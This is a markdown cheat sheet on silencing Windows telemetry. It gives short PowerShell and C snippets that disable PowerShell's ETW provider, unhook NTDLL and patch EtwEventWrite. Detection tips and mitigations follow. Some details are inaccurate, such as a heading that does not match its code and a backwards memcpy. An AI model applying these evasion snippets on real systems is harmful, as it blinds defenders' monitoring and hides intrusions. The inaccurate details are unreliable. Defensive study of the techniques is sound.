# 🪝 Hooking ETW + Sysmon + EDR Userland - Silencing the Watchers

**ETW (Event Tracing for Windows)** and tools like **Sysmon** or **userland EDR agents** collect telemetry on system activity. Advanced attackers bypass these by **patching, unhooking, or disabling** their telemetry mechanisms at runtime.

> ⚠️ This is what ransomware crews, APTs, and high-end malware like **Cobalt Strike**, **BlackCat**, and **Raspberry Robin** use to go dark.

---

## 🛠️ What It Does
- Hooks or patches security-related APIs
- Blinds Sysmon, EDR, and ETW consumers from seeing real activity
- Works at user-mode or kernel-level (if driver access exists)

---

## 💣 ETW Patch Example - Kill PowerShell Telemetry

### 1. Overwrite ETW Callback with NOPs
```powershell
$etw = [System.Management.Automation.Tracing.PSEtwLogProvider].GetField('etwProvider', 'NonPublic,Static')
$etw.SetValue($null, [Guid]::Empty)
```
✅ Prevents PowerShell from registering with ETW subsystem

---

## 💣 Sysmon Hook Evasion - Remove EDR User Hooks
### 2. Manually Unhook NTDLL (Common EDR Target)
```c
memcpy(OriginalSyscallStub, HookedSyscall, Length);
```
Or use public tools:
- `unhook-ntdll.c`
- `Remove-EDR-hooks.ps1`
✅ Restores clean syscall stubs so EDR can't detect suspicious calls

---

### 3. Patching `EtwEventWrite()` (Core Logging Function)
```c
unsigned char patch[] = { 0xC3 }; // ret
WriteProcessMemory(hProc, (LPVOID)EtwEventWrite, patch, 1, NULL);
```
✅ Blinds the process from sending telemetry to ETW consumers

---

## 🕵️‍♂️ Detection Tips
| Indicator | Method |
|-----------|--------|
| Sudden drop in telemetry or logging | Monitor volume trends in Sysmon or SIEM |
| Memory patches to `ntdll`, `amsi.dll`, or `etw.dll` | Use EDR memory scan features or YARA rules |
| Use of `VirtualProtect`, `WriteProcessMemory` early in process | Common in EDR evasion payloads

---

## 🔐 Mitigation Strategies
- Use kernel-mode EDR with anti-hooking detection
- Validate integrity of loaded DLLs (hash checks, load order integrity)
- Monitor memory and syscall access APIs
- Detect missing ETW registrations from key processes like PowerShell, Office

---

> 🧠 This is how attackers erase their digital footprints *while still inside the house*. If they silence ETW and unhook EDR — your tools are watching nothing. Real red teams **disable the camera before the robbery.**
